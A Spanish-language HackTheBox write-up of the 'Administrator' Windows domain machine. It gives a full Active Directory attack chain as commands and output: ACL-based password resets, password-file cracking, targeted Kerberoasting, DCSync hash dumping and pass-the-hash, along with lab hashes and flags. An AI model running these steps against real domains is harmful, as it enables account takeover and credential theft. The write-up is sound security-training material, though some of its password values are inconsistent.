Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Medium
- Tags: #bloodhound #genericall #genericwrite #smb #targeted-kerberoast #dcsync #getchanges #acl

![](assets/Pasted%20image%2020260105222756.png)

Credenciales iniciales: **Username: Olivia Password: ichliebedich**

## Reconocimiento

Comienzo con un ping para comprobar conectividad.

```bash
┌──(wndr㉿wndr)-[~]
└─$ ping -c 1 10.129.23.175
PING 10.129.23.175 (10.129.23.175) 56(84) bytes of data.
64 bytes from 10.129.23.175: icmp_seq=1 ttl=127 time=85.3 ms

--- 10.129.23.175 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 85.341/85.341/85.341/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.23.175 -oG nmap/allPorts

Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE          REASON
21/tcp    open  ftp              syn-ack ttl 127
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
54419/tcp open  unknown          syn-ack ttl 127
61697/tcp open  unknown          syn-ack ttl 127
61702/tcp open  unknown          syn-ack ttl 127
61705/tcp open  unknown          syn-ack ttl 127
61722/tcp open  unknown          syn-ack ttl 127
```

- Vemos varios puertos abiertos entre ellos: 21 FTP, 139 445 SMB, 88 Kerberos, 53 DNS entre otros.


Sobre los puertos abiertos tiro un segundo escaneo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ sudo nmap -p 21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,54419,61697,61702,61705,61722 -sV -sC -Pn -n -sS --min-rate 5000 10.129.23.175 -oN nmap/target

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-06 11:32:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
54419/tcp open  msrpc         Microsoft Windows RPC
61697/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
61702/tcp open  msrpc         Microsoft Windows RPC
61705/tcp open  msrpc         Microsoft Windows RPC
61722/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-01-06T11:33:14
|_  start_date: N/A
|_clock-skew: 6h59m59s
```

Por la informacion recabada podemos intuir que estamos en contra de un `DC`.

- Puerto 88 Kerberos
- Puertos 139, 445 SMB
- 21 FTP: Microsoft FTPd
- Puerto 53 DNS
- Puerto 389 LDAP nos indica el dominio **administrator.htb**
- Puerto 135 RPC
- Puerto 5985 WinRm

Vamos a meter el dominio al **/etc/hosts**

```bash
10.129.23.175 DC DC.administrator.htb administrator.htb
```

## Enumeración

### Puerto 135 RPC.

Puedo conectarme al **RPC** utilizando mis credenciales iniciales para enumerar usuarios.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ rpcclient -U 'administrator.htb/Olivia' 10.129.23.175
Password for [ADMINISTRATOR.HTB\Olivia]:
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[olivia] rid:[0x454]
user:[michael] rid:[0x455]
user:[benjamin] rid:[0x456]
user:[emily] rid:[0x458]
user:[ethan] rid:[0x459]
user:[alexander] rid:[0xe11]
user:[emma] rid:[0xe12]
```

Tenemos los siguientes usuarios:

- Administrator
- Guest
- krbtgt
- olivia
- michael
- benjamin
- emily
- ethan
- alexander
- emma

### 139, 445 SMB

Saque informacion general de maquina utilizando `netexec`.

- Nombre de la maquina **DC**
- Dominio **administrator.htb**

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ nxc smb 10.129.23.175
SMB         10.129.23.175   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
```

**Enumeracion de Shares como usuario Olivia.**

Con mis credenciales iniciales puedo enumerar los shares a los que tengo acceso.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ nxc smb 10.129.23.175 -u 'Olivia' -p 'ichliebedich' --shares
SMB         10.129.23.175   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.23.175   445    DC               [+] administrator.htb\Olivia:ichliebedich
SMB         10.129.23.175   445    DC               [*] Enumerated shares
SMB         10.129.23.175   445    DC               Share           Permissions     Remark
SMB         10.129.23.175   445    DC               -----           -----------     ------
SMB         10.129.23.175   445    DC               ADMIN$                          Remote Admin
SMB         10.129.23.175   445    DC               C$                              Default share
SMB         10.129.23.175   445    DC               IPC$            READ            Remote IPC
SMB         10.129.23.175   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.23.175   445    DC               SYSVOL          READ            Logon server share
```

- El usuario Olivia tiene permisos de lectura en los shares IPC$, NETLOGON Y SYSVOL. Todos son shares estándar no habia nada raro.

## Acceso Inicial.

Probando las credenciales para otros servicios podemos ver que tenemos acceso via `WinRm.`

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ nxc winrm 10.129.23.175 -u Olivia -p 'ichliebedich'
WINRM       10.129.23.175   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.23.175   5985   DC               [+] administrator.htb\Olivia:ichliebedich (Pwn3d!)
```

Por lo cual podemos conectarnos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ evil-winrm -i 10.129.23.175 -u Olivia -p 'ichliebedich'

*Evil-WinRM* PS C:\Users\olivia\Documents> whoami
administrator\olivia
```

## Escalada de Privilegios con BloodHound.

Enumere manualmente la cosa pero honestamente no vi nada. Por lo cual opte por utilizar `bloodhound`.

- **BloodHound** es una herramienta de **enumeración y análisis de Active Directory** que usa **grafos** para identificar **relaciones de confianza, permisos y rutas de escalada de privilegios** entre usuarios, grupos y equipos dentro de un dominio.

Para eso primero tenemos que utilizar un **Ingestor** que se va a encargar de recopilar la data del dominio. En este caso utilice `bloodhound-python`

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator/content]
└─$ bloodhound-python -c All -u Olivia -p ichliebedich -d administrator.htb -ns 10.129.23.175 --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 19S
INFO: Compressing output into 20260105230151_bloodhound.zip
```

- Esto nos generara un ZIP

Ejecutare `bloodhound` e importare mi zip a la app.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator/content]
└─$ bloodhound
```

A partir del usuario **olivia**, BloodHound permitió identificar, mediante los **Outbound Control Objects**, distintos caminos de **movimiento lateral y escalada de privilegios** hacia otros usuarios del dominio, como **michael** y **benjamin**.

![](assets/Pasted%20image%2020260105231543.png)

### Abusando de GenericAll sobre el usuario michael

Olivia tiene el permiso **GenericAll** sobre el usuario **michael**, este permiso permite el control total sobre un objeto en **Active Directory**

- Una de las formas de abusar de este permiso es cambiando la contraseña para el usuario **michael**

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ evil-winrm -i 10.129.23.175 -u Olivia -p 'ichliebedich'

*Evil-WinRM* PS C:\Users\> net user michael password2 /domain

The command completed successfully.
```

Ahora nos podemos conectar como **michael** via WinRm

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator/content]
└─$ evil-winrm -i 10.129.23.175 -u michael -p password1


Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\michael\Documents> whoami
administrator\michael
```

### Abusando de ForceChangePassword sobre el usuario benjamin.

Como vimos en BloodHound el usuario **michael** tiene el permiso **ForceChangePassword** sobre el usuario **benjamin**.

- El permiso **ForceChangePassword** permite resetear la contraseña de un usuario de dominio.

BloodHound muestra distintas maneras de abusar de este permiso. En este caso se realizó el cambio de contraseña directamente desde mi host linux para demostrar una alternativa sin depender de un entorno Windows.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator/content]
└─$ net rpc password "benjamin" "passwordbenjamin" -U "administrator.htb"/"michael"%"password1." -S 10.129.23.175
```

- Estoy cambiando la password del usuario benjamin a **passwordbenjamin**

Benjamin no tiene acceso via `WinRm` por lo cual podemos probar sus credenciales en los otros servicios como `FTP` o `SMB`

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ nxc smb 10.129.23.175 -u benjamin -p 'passwordbenjamin'
SMB         10.129.23.175   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.23.175   445    DC               [+] administrator.htb\benjamin:passwordbenjamin

┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ nxc ftp 10.129.23.175 -u benjamin -p 'passwordbenjamin'
FTP         10.129.23.175   21     10.129.23.175    [+] benjamin:passwordbenjamin
```

- Benjamin tiene acceso a SMB y a FTP.

### FTP y crackeando psafe3

Al ingresar por `FTP` me encuentro con un solo archivo con con nombre `Backup.psafe3`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ ftp 10.129.23.175
Connected to 10.129.23.175.
220 Microsoft FTP Service
Name (10.129.23.175:wndr): benjamin
331 Password required
Password:
230 User logged in.


ftp> ls
229 Entering Extended Passive Mode (|||52320|)
125 Data connection already open; Transfer starting.
10-05-24  08:13AM                  952 Backup.psafe3
226 Transfer complete

ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||52322|)
125 Data connection already open; Transfer starting.
100% |**************************************************************************************************************************************************|   952        9.98 KiB/s    00:00 ETA
```

El archivo corresponde a una base de datos de contraseñas **Password Safe v3**.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ file Backup.psafe3
Backup.psafe3: Password Safe V3 database
```

- Está cifrado → primero hay que **extraer el hash**, luego **crackearlo**.

Con `pwsafe2john` extraemos el hash.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ pwsafe2john Backup.psafe3 > hash.txt
```

Ahora podemos crackear el hash.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)
1g 0:00:00:00 DONE (2026-01-05 23:45) 4.347g/s 35617p/s 35617c/s 35617C/s newzealand..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Contraseña: **tekieromucho**

Voy a abrir el archivo con Password Safe:

![](assets/Pasted%20image%2020260105234608.png)

Al momento de abrirlo me encuentro con 3 usuarios y sus credenciales las cuales exporte a un archivo.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator/loot]
└─$ cat creds.txt

alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

Puedo probar estas credenciales en distintos servicios.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator/loot]
└─$ nxc smb 10.129.23.175 -u users.txt -p passwords.txt
SMB         10.129.23.175   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.129.23.175   445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
SMB         10.129.23.175   445    DC               [-] administrator.htb\emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
SMB         10.129.23.175   445    DC               [-] administrator.htb\emma:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE
SMB         10.129.23.175   445    DC               [-] administrator.htb\alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE
SMB         10.129.23.175   445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb

┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator/loot]
└─$ nxc winrm 10.129.23.175 -u users.txt -p passwords.txt
WINRM       10.129.23.175   5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb)
WINRM       10.129.23.175   5985   DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.23.175   5985   DC               [-] administrator.htb\emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.23.175   5985   DC               [-] administrator.htb\emma:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
WINRM       10.129.23.175   5985   DC               [-] administrator.htb\alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
WINRM       10.129.23.175   5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
```

- Tanto para SMB como WinRm las credenciales del usuario **emily** funcionaron.

Voy a logearme via `WinRm` para ver si obtengo la flag.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator/content]
└─$ evil-winrm -i 10.129.23.175 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb

*Evil-WinRM* PS C:\Users\emily\Documents> whoami
administrator\emily
```

Obtenemos la primera flag en el directorio Desktop.

```bash
*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
94def9ce915e3e84e570733a250bd383
```

### Abusando de GenericAll y GetChanges.

Devuelta a BloodHound con nuestro nuevo usuario **emily** podemos volver a jugar con los Outbound Control Objects.

- Podemos ver que Emily tiene permisos **GenericWrite** sobre el usuario **Ethan**
- Este permiso nos permite modificar la mayoría de atributos de un usuario, en este caso **ethan**.

![](assets/Pasted%20image%2020260106010016.png)

- Y a su vez **ethan** tiene permisos **GetChanges** y **GetChangesAll** sobre el DC.
- Estos permisos combinados nos permite replicar objetos del dominio, leer atributos sensibles y solicitar hashes de usuarios. Estos permisos nos permiten realizar ataques DCSync.

![](assets/Pasted%20image%2020260106004721.png)

BloodHound nos indica 2 formas de abusar de **GenericWrite**.

- Targeted Kerberoast y Shadow Credentials.

```bash
 Targeted Kerberoast
A targeted kerberoast attack can be performed using targetedKerberoast.py.
targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.
The recovered hash can be cracked offline using the tool of your choice.

Shadow Credentials attack
To abuse this permission, use pyWhisker.
pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"
For other optional parameters, view the pyWhisker documentation.
```

En este caso voy a realizar el Targeted Kerberoast que consiste en:

- Escribir el atributo `servicePrincipalName` al usuario **ethan**
- Asignar un SPN falso al usuario **ethan**
- Solicitar un TGS para dicho servicio y obtener un hash Kerberos crackeable

Primero instalamos la herramienta.

```bash
┌──(wndr㉿wndr)-[~/Tools]
└─$ git clone https://github.com/ShutdownRepo/targetedKerberoast.git

┌──(wndr㉿wndr)-[~/Tools]
└─$ cd targetedKerberoast

┌──(wndr㉿wndr)-[~/Tools/targetedKerberoast]
└─$ python3 -m venv venv

┌──(wndr㉿wndr)-[~/Tools/targetedKerberoast]
└─$ source venv/bin/activate

┌──(wndr㉿wndr)-[~/Tools/targetedKerberoast]
└─$ pip3 install -r requirementes.txt

```

Ahora podemos ejecutar el ataque para obtener un hash kerberos crackeable.

```bash
┌──(venv)─(wndr㉿wndr)-[~/Tools/targetedKerberoast]
└─$ sudo ntpdate 10.129.23.175

┌──(venv)─(wndr㉿wndr)-[~/Tools/targetedKerberoast]
└─$ python3 targetedKerberoast.py -v -d 'administrator.htb' -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$85e296fc0d03af9f2505dc06255bb611$5a55ac6ea172ba1f525b9ed9bd0c1b9ed079e551d7ec5199137f770ad372b10ffd2ed64e99a62a9e9ab632f4d9d3badec4c4ea55b1b8153ac4df86f08e50211f227f660036fb902437c9955d1aa6e8690ca5090f2ce975bcfc44ec6adf324be3d807071c0820a93238522254d04ca96224e6e4591bb14d4c4e3360d3dc2f20879b975aecf374d87dda2f08dcb2765a185178084f8aa08780aa89177cd796c2a6d8eabe9183b31a71bc0c662e90dc9fc028d381ff79d46b3132db38d06c907a5ef92523c7db615e8968c5e594c27aef416602c54bf07d19211d6fa812c19595b8afe7eb6cb8425801e57cff568de87935f2ae3db38650bd1abf62be7fff757f565210f01609898a7acfd29a38ccbb28b2dd7a6f108d305ca21a8a3d32140b8d51a4c90c2b55662d8639aad70abd42901f072a9538dcf30e471e11186d23d86aacf939b645aa7a76e178722e4e7f10daf0616a9b0b5dbde32e75534728fae952f57a234c882ba096efa2aebebd09fa6c28fb6fa43bfc3ff26483f7313ffa32027030e219cba9e219ce82d7fc3690e6ae3287b304e1e43eb6e85a7046bcdc0c493227fb3cc15bfef90fd926d63d571ea7db28677d3e1ed1cd911e040e8dbf875c892df2af1018f6db58f437821172e5468686a0062b6cda9e58b5ce003724ef77680cd2c6d39b1bbffd9e0ef2c7683775c599c613d0339fcc3de6edaedecc5338efd1ea4c7772d8f56e05f7a0699011b62898e0b5b1bc672e39862687c0e61a25cfd14446e17f575daf684ddf07debbc3ed9501ad5097b28b11b6737c489db1a5bab83f96909965cc92d6b6285e925c32a8b5d46c2d4c9c421afe25d42497f0567c99bb5a0fcd1fe399d5f82b28b386ddeba27775ea09b116b472c115421bc8fb7367c910088ee7da55022034b1e09aa6aadbbe9298ffd96585c2b1a3b33d5bd51960ebccb65c2cf5fdc464756dceb2e9710bf13530792aac12dc7f2a0d738872206b326dc5b9bc3097f35b4e84f3c15fb61c686f7a664f92df2adc8ba747e2d50e93e90d4ba31f52302f457894a0eb7508a42766c6b667b8ee013c55c7e2b6cae006b33338bb1f537ad9dd0c76c2d44614724cc640d4838d0257f5e1d382d8ace31491551df681332d26e8078130800167a933d19f63e1fc8f6f7c41bf00f88c08eef668c9839bfb92dbfd28c8b20af3aac5843d7e8ffa870d742d0ca34b3fbd9361bafc2177c08775d773446972f3580878b28fbf08f7ad015598bacf587fe7a792b2f653dee589afebe554cbdcae282cb2e9992bd64df4da4c863ce5c711f3b3661719eface2c0e304a3e9cfb68c19ddd92f46f08175fd67bc110c80697a9b87153496becfd328a3676bcea5fc8b1ef4eccd2a541bd6c3f4d1773abc32462b98c6dd89d3f24d86d2683ad5c131528091f6c91ad1016f1f935f4e51331e98e61423cc9257a781a5394975cb5d49cb870172a331cbcc17f74afda868759c02700e909967125383727a31cd768d8ddc3ca466debd0f33d7a3e7dc813eda740111
[VERBOSE] SPN removed successfully for (ethan)
```

Guardo el hash y lo crackeo con `hashcat`.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator/loot]
└─$ hashcat -m 13100 ethan.hash /usr/share/wordlists/rockyou.txt

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$85e296fc0d03af9f2505dc06255bb611$5a55ac6ea172ba1f525b9ed9bd0c1b9ed079e551d7ec5199137f770ad372b10ffd2ed64e99a62a9e9ab632f4d9d3badec4c4ea55b1b8153ac4df86f08e50211f227f660036fb902437c9955d1aa6e8690ca5090f2ce975bcfc44ec6adf324be3d807071c0820a93238522254d04ca96224e6e4591bb14d4c4e3360d3dc2f20879b975aecf374d87dda2f08dcb2765a185178084f8aa08780aa89177cd796c2a6d8eabe9183b31a71bc0c662e90dc9fc028d381ff79d46b3132db38d06c907a5ef92523c7db615e8968c5e594c27aef416602c54bf07d19211d6fa812c19595b8afe7eb6cb8425801e57cff568de87935f2ae3db38650bd1abf62be7fff757f565210f01609898a7acfd29a38ccbb28b2dd7a6f108d305ca21a8a3d32140b8d51a4c90c2b55662d8639aad70abd42901f072a9538dcf30e471e11186d23d86aacf939b645aa7a76e178722e4e7f10daf0616a9b0b5dbde32e75534728fae952f57a234c882ba096efa2aebebd09fa6c28fb6fa43bfc3ff26483f7313ffa32027030e219cba9e219ce82d7fc3690e6ae3287b304e1e43eb6e85a7046bcdc0c493227fb3cc15bfef90fd926d63d571ea7db28677d3e1ed1cd911e040e8dbf875c892df2af1018f6db58f437821172e5468686a0062b6cda9e58b5ce003724ef77680cd2c6d39b1bbffd9e0ef2c7683775c599c613d0339fcc3de6edaedecc5338efd1ea4c7772d8f56e05f7a0699011b62898e0b5b1bc672e39862687c0e61a25cfd14446e17f575daf684ddf07debbc3ed9501ad5097b28b11b6737c489db1a5bab83f96909965cc92d6b6285e925c32a8b5d46c2d4c9c421afe25d42497f0567c99bb5a0fcd1fe399d5f82b28b386ddeba27775ea09b116b472c115421bc8fb7367c910088ee7da55022034b1e09aa6aadbbe9298ffd96585c2b1a3b33d5bd51960ebccb65c2cf5fdc464756dceb2e9710bf13530792aac12dc7f2a0d738872206b326dc5b9bc3097f35b4e84f3c15fb61c686f7a664f92df2adc8ba747e2d50e93e90d4ba31f52302f457894a0eb7508a42766c6b667b8ee013c55c7e2b6cae006b33338bb1f537ad9dd0c76c2d44614724cc640d4838d0257f5e1d382d8ace31491551df681332d26e8078130800167a933d19f63e1fc8f6f7c41bf00f88c08eef668c9839bfb92dbfd28c8b20af3aac5843d7e8ffa870d742d0ca34b3fbd9361bafc2177c08775d773446972f3580878b28fbf08f7ad015598bacf587fe7a792b2f653dee589afebe554cbdcae282cb2e9992bd64df4da4c863ce5c711f3b3661719eface2c0e304a3e9cfb68c19ddd92f46f08175fd67bc110c80697a9b87153496becfd328a3676bcea5fc8b1ef4eccd2a541bd6c3f4d1773abc32462b98c6dd89d3f24d86d2683ad5c131528091f6c91ad1016f1f935f4e51331e98e61423cc9257a781a5394975cb5d49cb870172a331cbcc17f74afda868759c02700e909967125383727a31cd768d8ddc3ca466debd0f33d7a3e7dc813eda740111:

:limpbizkit

```

- La password para el usuario **ethan** es limpbizkit

Ahora que tenemos acceso al usuario **ethan** podemos abusar de **GetChanges** como nos lo indicaba BloodHound para realizar un DCSync.

- Recordemos que GetChanges

```bash
You may perform a dcsync attack to get the password hash of an arbitrary principal using impacket's secretsdump.py example script:

secretsdump.py 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER'

You can also perform the more complicated ExtraSids attack to hop domain trusts. For information on this see the blog post by harmj0y in the references tab
```

Utilizando `impacket-secrestdump` realizamos el ataque DCSync:

- Básicamente el ataque DCSync simula el comportamiento de un DC y le pide al `DC` real replicar sus credenciales.

```bash
┌──(venv)─(wndr㉿wndr)-[~/Tools/targetedKerberoast]
└─$ impacket-secretsdump administrator.htb/ethan:limpbizkit@10.129.23.175
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:5835048ce94ad0564e29a924a03510ef:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:266fd018f321cc5630950bf59090d6fb:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
```

- Podemos ver el hash del Administrator

Ahora podemos logearnos via WinRm con Pass The Hash.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/administrator/content]
└─$ evil-winrm -i 10.129.23.175 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e


Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
administrator\administrator
```

Flag:

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
2c40dcb64a6806e968ef7b2a7101e1ad
```

***PWNED***

![](assets/Pasted%20image%2020260106003430.png)
